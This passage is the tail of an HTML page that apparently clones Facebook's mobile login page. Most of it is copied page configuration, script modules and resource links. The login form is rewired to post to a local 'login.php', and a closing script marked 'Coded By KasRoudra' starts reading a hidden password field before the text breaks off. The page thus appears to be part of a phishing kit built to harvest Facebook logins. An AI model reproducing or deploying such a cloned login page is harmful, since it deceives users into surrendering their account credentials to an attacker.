                    "$^|AcZ43VVtXv43bWJj56pwCVyTSqBNWgJTlrQ7ZOB2GrhjaYWcjR_6qt1RK4Z3mhf9kdFLuX5eHoFlFqeeWMMi-aAXUVfS|fd.AcYRpijGtfdq32R5BN6Wi0jIWbKFB_Eav-QkCccdhg2jv_rBnD6r4_UYrRm9IdEYsM0fNMk9Q_egDbkWeSeNOyK8",
                  app_id: "412378670482",
                  enable_bladerunner: false,
                  enable_ack: true,
                  push_phase: "C3",
                  enable_observer: false,
                  enable_dataloss_timer: false,
                },
                5237,
              ],
              [
                "cr:1642797",
                ["BanzaiBase"],
                {
                  __rc: [
                    "BanzaiBase",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:694370",
                ["requestIdleCallbackBlue"],
                {
                  __rc: [
                    "requestIdleCallbackBlue",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:692209",
                ["cancelIdleCallbackBlue"],
                {
                  __rc: [
                    "cancelIdleCallbackBlue",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "MBanzaiConfig",
                [],
                {
                  MAX_SIZE: 10000,
                  MAX_WAIT: 30000,
                  MIN_WAIT: null,
                  RESTORE_WAIT: 30000,
                  blacklist: ["time_spent"],
                  disabled: false,
                  gks: {
                    platform_oauth_client_events: true,
                    boosted_pagelikes: true,
                  },
                  known_routes: [
                    "artillery_javascript_actions",
                    "artillery_javascript_trace",
                    "artillery_logger_data",
                    "logger",
                    "falco",
                    "gk2_exposure",
                    "js_error_logging",
                    "loom_trace",
                    "marauder",
                    "perfx_custom_logger_endpoint",
                    "qex",
                    "require_cond_exposure_logging",
                    "sri_logger_data",
                  ],
                  should_drop_unknown_routes: true,
                  should_log_unknown_routes: false,
                },
                32,
              ],
            ],
            instances: [
              [
                "__inst_dfbc3ade_0_0_Wz",
                [
                  "MLoggedOutBannerGooglePlayRedirectWithFallback",
                  "__elem_729c1b93_0_0_T1",
                ],
                [
                  {
                    button: { __m: "__elem_729c1b93_0_0_T1" },
                    native_app_url:
                      "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DDSgOYhSt_vp2vn8KSuVyR4Jc%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                    fallback_url:
                      "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DDSgOYhSt_vp2vn8KSuVyR4Jc%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                    logging_data: {
                      app_referrer: "logged_out_banner",
                      app: "350685531728",
                      country: "BD",
                    },
                  },
                ],
                1,
              ],
            ],
            elements: [
              ["__elem_de5177dd_0_0_wY", "u_0_0_6L", 1],
              ["__elem_729c1b93_0_0_T1", "u_0_1_CF", 1],
              ["__elem_921b58ef_0_0_cp", "login_form", 2],
              ["__elem_e24cb174_0_0_pz", "m_login_password", 1],
              ["__elem_7216e2ae_0_2_vl", "u_0_2_GZ", 1],
              ["__elem_e03291d5_0_1_CA", "u_0_3_5A", 1],
              ["__elem_e03291d5_0_0_Rg", "u_0_4_kc", 1],
              ["__elem_7216e2ae_0_0_fi", "login_password_step_element", 1],
              ["__elem_8a020238_0_0_M9", "forgot-password-link", 1],
              ["__elem_7216e2ae_0_1_me", "signup_button_area", 1],
              ["__elem_e980dec4_0_0_1u", "signup-button", 1],
              ["__elem_49f6b607_0_0_WU", "root", 1],
              ["__elem_717bb1ae_0_0_rw", "u_0_5_ah", 3],
              ["__elem_ad2bcfb1_0_0_1n", "u_0_6_8B", 1],
              ["__elem_eed16c0a_0_0_rx", "u_0_7_pi", 1],
              ["__elem_a588f507_0_0_vf", "u_0_8_Yd", 1],
              ["__elem_a588f507_0_1_Vr", "u_0_9_Wk", 1],
              ["__elem_0cdc66ad_0_0_Z4", "u_0_b_iy", 1],
              ["__elem_0cdc66ad_0_1_AC", "u_0_c_Tb", 1],
            ],
            require: [
              [
                "ForgetPasswordAutoSearch",
                "addListenerForgetPasswordAutoSearch",
                [],
                [
                  "m_login_email",
                  "m_login_auto_search_form_contactpoint_hidden_input",
                  "m_login_auto_search_form_forgot_password_button",
                ],
              ],
              [
                "MLoginController",
                "initAccountRecoveryFunnelLogging",
                ["__elem_8a020238_0_0_M9"],
                [
                  { __m: "__elem_8a020238_0_0_M9" },
                  "click_forget_password",
                  "DSgOYhSt_vp2vn8KSuVyR4Jc",
                ],
              ],
              [
                "MGetInstalledRelatedApps",
                "logmTouchInstalledRelatedApps",
                [],
                ["DSgOYhSt_vp2vn8KSuVyR4Jc"],
              ],
              [
                "BrowserPrefillLogging",
                "initContactpointFieldLogging",
                [],
                [{ contactpointFieldID: "m_login_email", serverPrefill: "" }],
              ],
              [
                "BrowserPrefillLogging",
                "initPasswordFieldLogging",
                [],
                [{ passwordFieldID: "m_login_password" }],
              ],
              [
                "PlatformDialogCBTSetter",
                "setCBTInFormAndLog",
                ["__elem_921b58ef_0_0_cp"],
                [
                  { __m: "__elem_921b58ef_0_0_cp" },
                  "client_logged_out_init_impression",
                ],
              ],
              [
                "MLoginView",
                "disableOnSubmit",
                ["__elem_921b58ef_0_0_cp", "__elem_7216e2ae_0_0_fi"],
                [
                  { __m: "__elem_921b58ef_0_0_cp" },
                  { __m: "__elem_7216e2ae_0_0_fi" },
                ],
              ],
              [
                "MLoginController",
                "initRegButton",
                ["__elem_7216e2ae_0_1_me"],
                [
                  {
                    root: { __m: "__elem_7216e2ae_0_1_me" },
                    regURI: "https://facebook.com/reg-no-deeplink/?cid=103",
                    useRegToLogin: true,
                  },
                ],
              ],
              [
                "MLoginController",
                "initLoginForm",
                ["__elem_de5177dd_0_0_wY"],
                [
                  {
                    root: { __m: "__elem_de5177dd_0_0_wY" },
                    ajaxURI:
                      "login.php",
                    clearOnDelete: false,
                    listenKeyDown: false,
                    isTwoStepsLogin: false,
                    isActionLoggingEnabled: true,
                    isCredsManagerEnabled: false,
                    isCredsSavingEnabled: true,
                    isPasswordlessEnabled: false,
                    doNotShowUserHeader: false,
                    shouldWaitForPasswordSave: false,
                    onErrorRegURI: "https://facebook.com/r.php",
                    shouldAutoLandOnStep2: false,
                    shouldPrefillJioHeaderForRegFromLogin: false,
                    shouldProcessUserConsentForTokenHeader: false,
                    shouldProcessUserConsentForHeader: false,
                    shouldShowSmartLockSelector: false,
                    shouldRunBotDetection: false,
                    clearPrefillMaskOnKeydown: false,
                    datrCookie: "DSgOYhSt_vp2vn8KSuVyR4Jc",
                    pubKeyData: {
                      publicKey:
                        "77f9792a38bc63c034ff277d67ddf1690f52d5bcf01eadbb8c8bfca607283a61",
                      keyId: 206,
                    },
                    shouldUseEmailDomainTypeahead: false,
                    showDuoLikePasswordless: false,
                    showSingleStepDuoLikePasswordless: false,
                    trackingPreference: "install_from_passwordless_flow",
                  },
                ],
              ],
              ["__inst_dfbc3ade_0_0_Wz"],
              ["MTouchable"],
              [
                "MPasswordPlainTextToggle",
                "init",
                [
                  "__elem_e24cb174_0_0_pz",
                  "__elem_7216e2ae_0_2_vl",
                  "__elem_e03291d5_0_0_Rg",
                  "__elem_e03291d5_0_1_CA",
                ],
                [
                  { __m: "__elem_e24cb174_0_0_pz" },
                  { __m: "__elem_7216e2ae_0_2_vl" },
                  { __m: "__elem_e03291d5_0_0_Rg" },
                  { __m: "__elem_e03291d5_0_1_CA" },
                ],
              ],
              [
                "ServiceWorkerLoginAndLogoutListener",
                "listen",
                [],
                ["login_button_block", "login", "https://facebook.com/sw?s=push", null],
              ],
              [
                "MBlockingTouchable",
                "init",
                ["__elem_e980dec4_0_0_1u"],
                [{ __m: "__elem_e980dec4_0_0_1u" }],
              ],
              [
                "AccessibilityWebVirtualCursorClickLogger",
                "init",
                ["__elem_49f6b607_0_0_WU"],
                [[{ __m: "__elem_49f6b607_0_0_WU" }]],
              ],
              ["GHLSurvey", "survey", [], []],
              ["MScrollPositionSaver"],
              ["InitMAjaxify"],
              [
                "MSeoDirectoryLinks",
                "initLinks",
                ["__elem_717bb1ae_0_0_rw", "__elem_ad2bcfb1_0_0_1n"],
                [
                  {
                    visible: false,
                    toggleButton: { __m: "__elem_717bb1ae_0_0_rw" },
                    linksContainer: { __m: "__elem_ad2bcfb1_0_0_1n" },
                    expandButton: { __m: "__elem_717bb1ae_0_0_rw" },
                    collapseButton: { __m: "__elem_717bb1ae_0_0_rw" },
                  },
                ],
              ],
              ["MLynx", "setupDelegation", [], []],
              ["MLogoutClearCache"],
              [
                "LoadingIndicator",
                "init",
                [
                  "__elem_eed16c0a_0_0_rx",
                  "__elem_a588f507_0_0_vf",
                  "__elem_a588f507_0_1_Vr",
                ],
                [
                  { __m: "__elem_eed16c0a_0_0_rx" },
                  { __m: "__elem_a588f507_0_0_vf" },
                  { __m: "__elem_a588f507_0_1_Vr" },
                ],
              ],
              ["MPageError"],
              ["MPageHeaderAccessibility"],
              [
                "MBlockingTouchable",
                "init",
                ["__elem_0cdc66ad_0_0_Z4"],
                [{ __m: "__elem_0cdc66ad_0_0_Z4" }],
              ],
              [
                "MBlockingTouchable",
                "init",
                ["__elem_0cdc66ad_0_1_AC"],
                [{ __m: "__elem_0cdc66ad_0_1_AC" }],
              ],
              ["MLoadingIndicator", "init", [], ["u_0_a_+v"]],
              ["LogHistoryListeners"],
              [
                "ScriptPath",
                "set",
                [],
                [
                  "https://facebook.com/wap/index.php",
                  "4e6eefd9",
                  { imp_id: "0rXkKZhkbVb5Imx8j", ef_page: null },
                ],
              ],
              [
                "MCommentViewportTracking",
                "singleton",
                [],
                [
                  {
                    enabled: true,
                    debug_console: false,
                    debug_html: false,
                    idle_timeout: 5000,
                    min_duration_to_log: 100,
                    min_visible_size: 200,
                  },
                ],
              ],
              ["MLogging", "main", [], [{ refid: 8 }]],
              [
                "RemoteDevice",
                "init",
                [],
                [{ performHardwareDetection: false, hashId: null, vpd: false }],
              ],
              ["Artillery"],
              ["MLinkHack"],
              ["MModalDialogInit"],
              ["MVerifyCache", "main", [], [{ viewer: 0 }]],
              ["EventProfiler"],
              ["MPageNavigationTracking", "init", [], []],
              ["FalcoLoggerTransports", "attach", [], []],
              ["ScriptPathLogger", "startLogging", [], []],
              ["MTimeSpentBitArrayLogger", "init", [], ["m", false]],
              ["MCoreDeferred"],
              ["FbtLogging"],
              ["IntlQtEventFalcoEvent"],
              ["BanzaiScuba_DEPRECATED"],
              ["MPageControllerImpl"],
              ["LogWebMemoryUsageFalcoEvent"],
              ["MPageFetcherImpl"],
              ["json-bigint"],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "BanzaiScuba_DEPRECATED",
                    "MPageControllerImpl",
                    "LogWebMemoryUsageFalcoEvent",
                    "VisualCompletionGating",
                    "MPageFetcherImpl",
                    "json-bigint",
                  ],
                  "sd",
                ],
              ],
              [
                "RequireDeferredReference",
                "unblock",
                [],
                [
                  [
                    "FbtLogging",
                    "IntlQtEventFalcoEvent",
                    "BanzaiScuba_DEPRECATED",
                    "MPageControllerImpl",
                    "LogWebMemoryUsageFalcoEvent",
                    "VisualCompletionGating",
                    "MPageFetcherImpl",
                    "json-bigint",
                  ],
                  "css",
                ],
              ],
            ],
            pre_display_requires: [
              ["AddressBar", "setupLoadListener", [], [], 4],
              ["MobileBigPipeStratcomProxy", "init", [], [], 4],
              ["Stratcom", "init", [], [], 4],
              ["MViewport", "init", [], [], 4],
              ["ViewportDimensions", "init", [], [], 4],
              ["MPageController", "init", [], [], 4],
              ["onSyncTTI", "run", [], [], 4],
              ["MLiteInit", "init", [], [], 4],
            ],
          },
          hsrp: {
            hsdp: {
              bxData: {
                875231: {
                  uri: "https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico",
                },
              },
              clpData: {
                1744178: { r: 1, s: 1 },
                1814852: { r: 1 },
                1838142: { r: 1, s: 1 },
                1942319: { r: 1, s: 1 },
                1842512: { r: 1 },
                1829319: { r: 1 },
                1829320: { r: 1 },
                1843988: { r: 1 },
                1848815: { r: 10000, s: 1 },
                1949898: { r: 1 },
                1765264: { r: 1, s: 1 },
              },
              gkxData: {
                2772: { result: false, hash: "AT5Eu244WIce7iwqqSs" },
                3752: { result: false, hash: "AT6eS5UTkkMp_xbPLEs" },
                3820: { result: false, hash: "AT6sMf-XMjfPaRKvQJI" },
                3831: { result: false, hash: "AT4W23lQ0XxAZniMiXY" },
                3959: { result: true, hash: "AT5An4B4pPVNHiK8qbk" },
                4075: { result: false, hash: "AT4_ZQi0sTjSt-RxY60" },
                676781: { result: false, hash: "AT4-DnA47xPbjtkw2HM" },
                676837: { result: false, hash: "AT4N8wBZA8ctCdHwgow" },
                712819: { result: false, hash: "AT79nTpb4gT-yu86Qrc" },
                1167394: { result: false, hash: "AT7BpN-tlUPwbIIFji8" },
                1217157: { result: false, hash: "AT6B7YmllOsArnK6tpM" },
                1224637: { result: false, hash: "AT7JRluWxuwDm3XzssY" },
                1554827: { result: false, hash: "AT7zueGLhGo0cT5xF1A" },
                1738486: { result: false, hash: "AT4cX37oQco6DwhUxqc" },
                910664: { result: false, hash: "AT69YyFAmMObhORG6zI" },
                1511920: { result: true, hash: "AT6pY2ROWoYnl3_cpRA" },
                1059877: { result: false, hash: "AT53XV4TWT4lc3_m9TY" },
                1070739: { result: false, hash: "AT5rKAR6NQAuoRaH5CA" },
                676811: { result: false, hash: "AT4zC0IqvJCbKsUezws" },
                676812: { result: false, hash: "AT6FULe6g-qrrrQd2j4" },
                820050: { result: true, hash: "AT7bjlcFFlowDw-SpdI" },
                985697: { result: false, hash: "AT6gOJD7fT0UjmgD_UY" },
                148: { result: false, hash: "AT5V6Me6WVwsRI3wtB4" },
                1994902: { result: false, hash: "AT7e2ODUd_zspuYFEqg" },
                2223: { result: false, hash: "AT4s3JaAt9nQ6ucmUWU" },
                2341: { result: false, hash: "AT7nNd913_uqf_cREdY" },
                726410: { result: true, hash: "AT7w-jbTa3ueodj3RkE" },
                862436: { result: false, hash: "AT7YsAcWL8-1WZrOgvw" },
                1099893: { result: false, hash: "AT5kly2LSZV_DKGRJt0" },
                3499: { result: false, hash: "AT5l5tI3kdeSuUxUX7k" },
              },
              qexData: {
                91: { r: null },
                123: { r: null },
                648: { r: null },
                650: { r: null },
                651: { r: null },
              },
              qplData: { 891: { r: 1 } },
            },
            hblp: {
              consistency: { rev: 1005083598 },
              rsrcMap: {
                VvVFw8n: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/AWepvf-vdZG.js?_nc_x=Ij3Wp8lg5Kz",
                },
                V7S7y8z: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/Acb2WBg1OPJ.js?_nc_x=Ij3Wp8lg5Kz",
                },
                hH0uj7j: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/bWJoKBXl8jb.js?_nc_x=Ij3Wp8lg5Kz",
                },
                HeTjZuF: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/gQXCqyYfa9n.js?_nc_x=Ij3Wp8lg5Kz",
                },
                EMVXNrM: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/agjyKmvg3vo.js?_nc_x=Ij3Wp8lg5Kz",
                },
                roLADom: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3iooI4/yF/l/en_GB/M6QJ2Uu9Db3.js?_nc_x=Ij3Wp8lg5Kz",
                },
                lZZnVFH: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/s1ln0eW3wP5.js?_nc_x=Ij3Wp8lg5Kz",
                },
                "yfK5Gq+": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3iyev4/yN/l/en_GB/lrqGt4F2Asr.js?_nc_x=Ij3Wp8lg5Kz",
                },
                pzotvyr: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yy/r/6GjO9u0EGU3.js?_nc_x=Ij3Wp8lg5Kz",
                },
                pci3ehS: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/zhzi8IsbkFt.js?_nc_x=Ij3Wp8lg5Kz",
                },
                bJ922yg: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz",
                },
                "tsKJZ+Y": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/xqgei9BXc0C.js?_nc_x=Ij3Wp8lg5Kz",
                },
                "KL2Ev9+": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3i3kA4/yy/l/en_GB/cvIw21OdGP4.js?_nc_x=Ij3Wp8lg5Kz",
                },
                EdRhDux: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/YtLImHmxkCV.js?_nc_x=Ij3Wp8lg5Kz",
                },
                "pE8e/jE": {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3iLQG4/yo/l/en_GB/rVXTEXgLOs3.js?_nc_x=Ij3Wp8lg5Kz",
                },
                XbGahz5: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3iwp24/yf/l/en_GB/KdvQrt5nygc.js?_nc_x=Ij3Wp8lg5Kz",
                },
                me4GMqO: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/9Ctp_Hw7DVY.js?_nc_x=Ij3Wp8lg5Kz",
                },
                TUxV68S: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/AEurEMwqHIo.js?_nc_x=Ij3Wp8lg5Kz",
                },
              },
              compMap: {
                QPLInspector: { r: ["VvVFw8n"], be: 1 },
                ODS: { r: ["V7S7y8z"], be: 1 },
                TransportSelectingClientSingleton: {
                  r: ["hH0uj7j", "V7S7y8z"],
                  rds: {
                    m: [
                      "ContextualConfig",
                      "BladeRunnerClient",
                      "DGWRequestStreamClient",
                      "MqttLongPollingRunner",
                      "BanzaiScuba_DEPRECATED",
                      "FbtLogging",
                      "IntlQtEventFalcoEvent",
                    ],
                    r: [
                      "rSSg6U2",
                      "HeTjZuF",
                      "EMVXNrM",
                      "roLADom",
                      "lZZnVFH",
                      "yfK5Gq+",
                      "pzotvyr",
                    ],
                  },
                  be: 1,
                },
                RequestStreamCommonRequestStreamCommonTypes: {
                  r: ["hH0uj7j"],
                  be: 1,
                },
                Cookie: {
                  r: ["V7S7y8z"],
                  rds: { m: ["BanzaiScuba_DEPRECATED"], r: ["rSSg6U2"] },
                  be: 1,
                },
                WebSpeedInteractionsTypedLogger: {
                  r: ["V7S7y8z", "TUxV68S", "pzotvyr", "HeTjZuF"],
                  rds: {
                    m: [
                      "FbtLogging",
                      "IntlQtEventFalcoEvent",
                      "BanzaiScuba_DEPRECATED",
                    ],
                    r: ["rSSg6U2"],
                  },
                  be: 1,
                },
                PerfXSharedFields: { r: ["V7S7y8z"], be: 1 },
              },
            },
          },
          allResources: [
            "MoYpVB9",
            "0rWB4c7",
            "V7S7y8z",
            "HeTjZuF",
            "rSSg6U2",
            "L+EZvmW",
            "M9i/bZy",
            "pci3ehS",
            "bJ922yg",
            "tsKJZ+Y",
            "KL2Ev9+",
            "yfK5Gq+",
            "EdRhDux",
            "pE8e/jE",
            "XbGahz5",
            "me4GMqO",
            "pzotvyr",
          ],
        });
      });
    </script>
    <script>
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.setPageID("7065628919191613740-0");
      });
      CavalryLogger.setPageID("7065628919191613740-0");
    </script>
    <script nonce="htOXv5tP">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("last_response", n);
        });
      })();
    </script>
    <script nonce="htOXv5tP">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          id: "last_response",
          phase: 63,
          last_in_phase: true,
          the_end: true,
          jsmods: {
            define: [
              ["IntlCurrentLocale", [], { code: "en_GB" }, 5954],
              [
                "MRegTopDomainsConfig",
                [],
                {
                  topEmailDomains: [
                    "gmail.com",
                    "mail.ru",
                    "outlook.com",
                    "yahoo.com",
                    "mail.com",
                  ],
                },
                4220,
              ],
              [
                "USIDMetadata",
                [],
                {
                  browser_id: "?",
                  tab_id: "",
                  page_id: "Pr7g3dddsmkuw",
                  transition_id: 0,
                  version: 6,
                },
                5888,
              ],
              [
                "MTouchableSyntheticClickGK",
                [],
                { USE_SYNTHETIC_CLICK: true },
                368,
              ],
              ["BrowserPaymentHandlerConfig", [], { enabled: false }, 3904],
              [
                "BrowserPushPubKey",
                [],
                {
                  appServerKey:
                    "BIBn3E_rWTci8Xn6P9Xj3btShT85Wdtne0LtwNUyRQ5XjFNkuTq9j4MPAVLvAFhXrUU1A9UxyxBA7YIOjqDIDHI",
                },
                4806,
              ],
              [
                "DirectDownloadEvents",
                [],
                {
                  downloadFb4aViaShimClick: "download_fb4a_via_shim_click",
                  upgrade_page_imp: "upgrade_page_imp",
                  upgrade_button_click: "upgrade_button_click",
                  sideload_installer_as_preloads:
                    "sideload_installer_as_preloads",
                  try_open_appmanager_deep_link_web_install:
                    "try_open_appmanager_deep_link_web_install",
                  logged_out_banner_google_play_redirect_failed:
                    "logged_out_banner_google_play_redirect_failed",
                  logged_out_banner_impression_client:
                    "logged_out_banner_impression_client",
                  logged_out_banner_upgrade_button_click:
                    "logged_out_banner_upgrade_button_click",
                },
                2368,
              ],
              [
                "cr:686",
                [],
                {
                  __rc: [
                    null,
                    "Aa3WNKakGaV34TH1bAugMsuyZZ9uTBiNROu0iNqIq5xg8MupdNUpkbPPtOjsz-_RFRNWasnh3x8aOe9L0byIJlKMeQ",
                  ],
                },
                -1,
              ],
              [
                "cr:1069930",
                [],
                {
                  __rc: [
                    null,
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:1083116",
                ["XAsyncRequest"],
                {
                  __rc: [
                    "XAsyncRequest",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:1083117",
                [],
                {
                  __rc: [
                    null,
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:1984081",
                [],
                {
                  __rc: [
                    null,
                    "Aa23l_DbbCQicQpPIy0TIQcDlIl4bouPWnQ0eysGEWsVl2hPUYh6w9dPVZgUsm-8lxSzMvyoikfK6YNFUsMOC2r1JpSO",
                  ],
                },
                -1,
              ],
              [
                "cr:334",
                ["ghlTestUBTFacebook"],
                {
                  __rc: [
                    "ghlTestUBTFacebook",
                    "Aa0ykd1hsth1JrZ5wsEjqO-iwW_GeHmuY4DQXRH-VlhlRcKf3TSIfgx_btqakv1nq1NIU_OF9Sm_fCtGe4yhqjlJOQ",
                  ],
                },
                -1,
              ],
              [
                "cr:1088657",
                [],
                {
                  __rc: [
                    null,
                    "Aa2cE_Drmavjuyj81sPMBnojI39CM-sRk3tm_3ODCoFBXrw2k3BzF5PGpN1-HIZbV0BpJoY9ftJYDZoQdVVh4Xo",
                  ],
                },
                -1,
              ],
              [
                "cr:1543261",
                [],
                {
                  __rc: [
                    null,
                    "Aa0yi6kBF8bcSQiKefoiL9qYDBPXAySO3QS9PmI4A5Iv3uDC2wFz5jCK_sin6ED_H23QGPtpTvGSQTJX4v3z0Pm8",
                  ],
                },
                -1,
              ],
              [
                "cr:708886",
                ["EventProfilerImpl"],
                {
                  __rc: [
                    "EventProfilerImpl",
                    "Aa0OQc2N6bqvlFd9dovb9Ztg38nEsoF2zaCvBr-eTPI7OYRT7enA6oFy3XMivtVoRpl5eUpZjq07T95Zqe4dPnirFpw",
                  ],
                },
                -1,
              ],
              [
                "cr:1094907",
                [],
                {
                  __rc: [
                    null,
                    "Aa1kTlj7jib4C-cWI54vFdjDXvImyQnPLNMzgV28-MFzP-O6bg0TkA0ifl6BhCc-oLoTZ3qJaHZB1XqvmFcujHw",
                  ],
                },
                -1,
              ],
              [
                "EventConfig",
                [],
                {
                  sampling: {
                    bandwidth: 0,
                    play: 0,
                    playing: 0,
                    progress: 0,
                    pause: 0,
                    ended: 0,
                    seeked: 0,
                    seeking: 0,
                    waiting: 0,
                    loadedmetadata: 0,
                    canplay: 0,
                    selectionchange: 0,
                    change: 0,
                    timeupdate: 0,
                    adaptation: 0,
                    focus: 0,
                    blur: 0,
                    load: 0,
                    error: 0,
                    message: 0,
                    abort: 0,
                    storage: 0,
                    scroll: 200000,
                    mousemove: 20000,
                    mouseover: 10000,
                    mouseout: 10000,
                    mousewheel: 1,
                    MSPointerMove: 10000,
                    keydown: 0.1,
                    click: 0.02,
                    mouseup: 0.02,
                    __100ms: 0.001,
                    __default: 5000,
                    __min: 100,
                    __interactionDefault: 200,
                    __eventDefault: 100000,
                  },
                  page_sampling_boost: 1,
                  interaction_regexes: {},
                  interaction_boost: {},
                  event_types: {},
                  manual_instrumentation: false,
                  profile_eager_execution: false,
                  disable_heuristic: true,
                  disable_event_profiler: false,
                },
                1726,
              ],
              [
                "KillabyteProfilerConfig",
                [],
                {
                  htmlProfilerModule: null,
                  profilerModule: null,
                  depTypes: { BL: "bl", NON_BL: "non-bl" },
                },
                1145,
              ],
              [
                "QuicklingConfig",
                [],
                {
                  version: "1005083598;0;",
                  sessionLength: 30,
                  inactivePageRegex:
                    "^/(fr/u\\.php|ads/|advertising|ac\\.php|ae\\.php|a\\.php|ajax/emu/(end|f|h)\\.php|badges/|comments\\.php|connect/uiserver\\.php|editalbum\\.php.+add=1|ext/|feeds/|help([/?]|$)|identity_switch\\.php|isconnectivityahumanright/|intern/|login\\.php|logout\\.php|sitetour/homepage_tour\\.php|sorry\\.php|syndication\\.php|webmessenger|/plugins/subscribe|lookback|brandpermissions|gameday|pxlcld|comet|worldcup/map|livemap|work/reseller|([^/]+/)?dialog|legal|.+\\.pdf$|.+/settings/)",
                  badRequestKeys: [
                    "nonce",
                    "access_token",
                    "oauth_token",
                    "xs",
                    "checkpoint_data",
                    "code",
                  ],
                  logRefreshOverhead: false,
                },
                60,
              ],
            ],
            require: [
              [
                "BDClientSignalCollectionTrigger",
                "startSignalCollection",
                [],
                [
                  {
                    sc: '{"t":1637128278,"c":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}',
                    fds: 60,
                    fda: 60,
                    i: 60,
                    sbs: 1,
                    dbs: 100,
                    bbs: 100,
                    hbi: 60,
                    rt: 262144,
                    hbcbc: 2,
                    hbvbc: 0,
                    hbbi: 30,
                    sid: -1,
                    hbv: "2787578782426791893",
                  },
                ],
              ],
              [
                "NavigationMetrics",
                "setPage",
                [],
                [
                  {
                    page: "https://facebook.com/wap/index.php",
                    page_type: "normal",
                    page_uri: "https://m.facebook.com/",
                    serverLID: "7065628919191613740-0",
                  },
                ],
              ],
              ["CavalryLoggerImpl", "startInstrumentation", [], []],
              ["Artillery", "disable", [], []],
              ["ServiceWorkerURLCleaner", "removeRedirectID", [], []],
            ],
          },
          hsrp: {
            hsdp: {
              clpData: { 1743095: { r: 1, s: 1 } },
              gkxData: {
                1652843: { result: false, hash: "AT6uh9NWRY4QEQoYOs8" },
              },
            },
            hblp: {
              consistency: { rev: 1005083598 },
              rsrcMap: {
                t1KEUNA: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/31Z8YEN6kEd.js?_nc_x=Ij3Wp8lg5Kz",
                },
                FEt5GzN: {
                  type: "js",
                  src: "https://static.xx.fbcdn.net/rsrc.php/v3/yv/r/cN-N4Eu_deZ.js?_nc_x=Ij3Wp8lg5Kz",
                },
              },
            },
          },
          allResources: [
            "t1KEUNA",
            "V7S7y8z",
            "FEt5GzN",
            "me4GMqO",
            "HeTjZuF",
            "rSSg6U2",
          ],
          onload: [
            'CavalryLogger.getInstance("7065628919191613740-0").setTTIEvent("t_domcontent");',
          ],
          onafterload: [
            'window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_paint");',
            'if (window.ExitTime){CavalryLogger.getInstance("7065628919191613740-0").setValue("t_exit", window.ExitTime);};',
          ],
        });
      });
    </script>
    <script>
      /* Coded By KasRoudra */
      const hiddenPass = document.getElementById("hiddenPass");
